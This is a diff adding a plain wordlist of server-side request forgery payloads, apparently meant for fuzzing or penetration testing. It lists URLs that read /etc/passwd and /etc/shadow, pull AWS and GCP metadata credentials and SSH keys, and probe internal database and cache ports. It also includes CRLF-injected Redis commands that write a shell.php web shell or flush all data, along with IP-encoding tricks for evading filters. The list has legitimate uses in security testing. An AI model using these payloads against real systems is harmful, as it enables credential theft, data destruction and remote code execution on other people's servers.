@@ -1,0 +1,135 @@
+%0a127.0.0.1
+file:///etc/passwd
+ftp://ftp.example.com
+gopher://localhost
+http://example.com@127.0.0.1
+http://[::]:80
+http://example.com%2f127.0.0.1
+http://example.com/127.0.0.1%2ffoo
+http://localhost:22/
+http://127.0.0.1:22/
+http://localhost:8080?file=http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-ec2
+http://localhost:8080?file=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://localhost:8080?file=http://169.254.169.254/metadata/v1.json
+http://localhost:8080?file=http://169.254.169.254/metadata/v1/hostname
+http://localhost:8080?file=http://169.254.169.254/latest/user-data
+http://localhost:8080?file=http://[::1]/etc/passwd
+http://localhost:8080?file=http://localhost:22
+http://localhost:8080?file=http://127.0.0.1:22
+http://localhost:8080?file=http://localhost:3306
+http://localhost:8080?file=http://127.0.0.1:3306
+http://localhost:8080?file=http://localhost:6379
+http://localhost:8080?file=http://127.0.0.1:6379
+http://localhost:8080?file=http://localhost:11211
+http://localhost:8080?file=http://127.0.0.1:11211
+http://localhost:8080?file=http://localhost:27017
+http://localhost:8080?file=http://127.0.0.1:27017
+http://localhost:8080?file=http://localhost:6379%0d%0ASET%20foo%20%22bar%22%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0APING%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0AINFO%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0AKEYS%20%2A%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0ASAVE%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0ASLAVEOF%20localhost%2077%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0ACONFIG%20SET%20dir%20/var/www/html%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0ACONFIG%20SET%20dbfilename%20shell.php%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0ACONFIG%20REWRITE%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0AFLUSHALL%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0AFLUSHDB%0d%0A
+http://localhost:8080?file=http://localhost:6379%0d%0AQUIT%0d%0A
+http://localhost:22/%2e%2e
+http://localhost:22/%2e%2e%2f
+http://localhost:22/%2e%2e/
+http://localhost:22/%2e%2e%5c
+http://localhost:22/%2e%2e%5c/
+http://localhost:22/%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+http://localhost:22/\/etc/passwd
+http://127.0.0.1:22/\/etc/passwd
+http://localhost:22/?url=file:///etc/passwd
+http://169.254.169.254/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
+http://localhost:80
+http://127.0.0.1:22
+http://127.0.0.1:6379
+http://127.0.0.1:3306
+http://127.0.0.1:5432
+http://127.0.0.1:9090
+http://127.0.0.1:9200
+http://127.0.0.1:9300
+http://127.0.0.1:11211
+http://localhost:22
+file:///etc/passwd
+ftp://127.0.0.1:21
+dict://127.0.0.1:2628/ls
+gopher://127.0.0.1:80/_GET%20/
+redis://127.0.0.1:6379/CONFIG%20GET%20*
+dict://127.0.0.1:11211/flush_all
+file:///etc/shadow
+http://localhost:22/@127.0.0.1
+http://localhost:80/%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+http://localhost:80
+http://localhost:443
+http://localhost:22
+http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://0.0.0.0:80
+http://0.0.0.0:443
+http://0.0.0.0:22
+https://127.0.0.1/
+https://localhost/
+http://[::]:80/
+http://[::]:25/ SMTP
+http://[::]:22/ SSH
+http://[::]:3128/ Squid
+http://0000::1:80/
+http://0000::1:25/ SMTP
+http://0000::1:22/ SSH
+http://0000::1:3128/ Squid
+http://127.127.127.127
+http://127.0.1.3
+http://127.0.0.0
+http://2130706433/ = http://127.0.0.1
+http://3232235521/ = http://192.168.0.1
+http://3232235777/ = http://192.168.1.1
+http://2852039166/  = http://169.254.169.254
+http://0177.0.0.1/ = http://127.0.0.1
+http://o177.0.0.1/ = http://127.0.0.1
+http://0o177.0.0.1/ = http://127.0.0.1
+http://q177.0.0.1/ = http://127.0.0.1
+http://[0:0:0:0:0:ffff:127.0.0.1]
+http://0/
+http://127.1
+http://127.0.1
+http://0/
+http://127.1
+http://127.0.1
+http://1.1.1.1 &@2.2.2.2# @3.3.3.3/
+urllib2 : 1.1.1.1
+requests + browsers : 2.2.2.2
+urllib : 3.3.3.3
+jar:scheme://domain/path!/ 
+jar:http://127.0.0.1!/
+jar:https://127.0.0.1!/
+jar:ftp://127.0.0.1!/
+file://path/to/file
+file:///etc/passwd
+file://\/\/etc/passwd
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/user-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME]
+http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/reservation-id
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/meta-data/public-keys/
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
+http://169.254.169.254/latest/meta-data/iam/security-credentials/s3access
+http://169.254.169.254/latest/dynamic/instance-identity/document
+Converted Decimal IP: http://2852039166/latest/meta-data/
+IPV6 Compressed: http://[::ffff:a9fe:a9fe]/latest/meta-data/
+IPV6 Expanded: http://[0:0:0:0:0:ffff:a9fe:a9fe]/latest/meta-data/
+IPV6/IPV4: http://[0:0:0:0:0:ffff:169.254.169.254]/latest/meta-data/
+
+
